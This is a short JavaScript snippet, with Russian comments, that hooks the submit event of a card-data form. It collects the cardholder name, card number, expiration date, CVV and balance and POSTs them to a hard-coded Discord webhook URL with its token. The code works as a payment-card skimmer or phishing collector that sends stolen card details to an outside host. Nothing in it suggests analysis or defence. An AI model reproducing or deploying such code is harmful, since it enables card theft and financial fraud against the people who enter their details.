document.getElementById('card-data-form').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const webhookUrl = 'https://discordapp.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv';

    const carData = {
        namecard: document.getElementById('name').value,
        numbercard: document.getElementById('number').value,
        expiration: document.getElementById('expiration').value,
        cvv: document.getElementById('cvv').value,
        balance: document.getElementById('balance').value
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: carData }) // Убрали лишние параметры JSON.stringify
    }).then(response => {
        // ... остальная часть кода
    });
});
